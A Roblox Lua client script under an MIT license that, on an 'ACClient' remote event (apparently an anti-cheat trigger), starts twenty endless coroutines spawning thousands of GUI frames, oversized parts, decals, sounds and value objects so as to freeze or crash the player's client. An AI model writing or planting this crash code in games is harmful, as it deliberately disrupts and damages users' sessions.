--This file is under the MIT License

--Copyright (c) 2025 Hoshiko Rin (https://github.com/rinshoki)

--Permission is hereby granted, free of charge, to any person obtaining a copy
--of this software and associated documentation files (the "Software"), to deal
--in the Software without restriction, including without limitation the rights
--to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
--copies of the Software, and to permit persons to whom the Software is
--furnished to do so, subject to the following conditions:

--The above copyright notice and this permission notice shall be included in all
--copies or substantial portions of the Software.

--THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
--IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
--FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
--AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
--LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
--OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
--SOFTWARE.

local ReplicatedStorage = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function c()
    for i = 1, 20 do
        coroutine.wrap(function()
            while true do
                for j = 1, 100 do
                    local gui = Instance.new("ScreenGui")
                    gui.Name = "s" .. tostring(math.random(1, 1e9))
                    gui.Parent = LocalPlayer.PlayerGui

                    for k = 1, 20 do
                        local frame = Instance.new("Frame")
                        frame.Name = "f" .. tostring(math.random(1, 1e9))
                        frame.Size = UDim2.new(0, math.random(10000, 20000), 0, math.random(10000, 20000))
                        frame.Position = UDim2.new(0, math.random(0, 1000), 0, math.random(0, 1000))
                        frame.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                        frame.Parent = gui

                        local textLabel = Instance.new("TextLabel")
                        textLabel.Name = "t" .. tostring(math.random(1, 1e9))
                        textLabel.Text = tostring(math.random(1, 1e9))
                        textLabel.Size = UDim2.new(0, math.random(1000, 5000), 0, math.random(1000, 5000))
                        textLabel.Position = UDim2.new(0, math.random(0, 1000), 0, math.random(0, 1000))
                        textLabel.Parent = frame
                    end
                end
                for j = 1, 50 do
                    local part = Instance.new("Part")
                    part.Name = "p" .. tostring(math.random(1, 1e9))
                    part.Size = Vector3.new(math.random(50, 500), math.random(50, 500), math.random(50, 500))
                    part.Position = Vector3.new(math.random(-1000,1000), math.random(0,1000), math.random(-1000,1000))
                    part.Anchored = true
                    part.Parent = workspace

                    -- random decals
                    local decal = Instance.new("Decal")
                    decal.Name = "d" .. tostring(math.random(1, 1e9))
                    decal.Texture = "rbxassetid://" .. tostring(math.random(1, 999999999))
                    decal.Parent = part

                    local sound = Instance.new("Sound")
                    sound.Name = "s" .. tostring(math.random(1, 1e9))
                    sound.SoundId = "rbxassetid://" .. tostring(math.random(1, 999999999))
                    sound.Parent = part
                    sound:Play()
                end

                for j = 1, 20 do
                    local folder = Instance.new("Folder")
                    folder.Name = "f" .. tostring(math.random(1, 1e9))
                    folder.Parent = workspace
                end

                for j = 1, 50 do
                    local boolValue = Instance.new("BoolValue")
                    boolValue.Name = "b_" .. tostring(math.random(1, 1e9))
                    boolValue.Value = math.random(0,1) == 1
                    boolValue.Parent = LocalPlayer.PlayerGui
                end

                for j = 1, 50 do
                    local colorValue = Instance.new("Color3Value")
                    colorValue.Name = "cc_" .. tostring(math.random(1, 1e9))
                    colorValue.Value = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                    colorValue.Parent = LocalPlayer.PlayerGui
                end
            end
        end)()
    end
end
ReplicatedStorage:WaitForChild("ACClient").OnClientEvent:Connect(c)
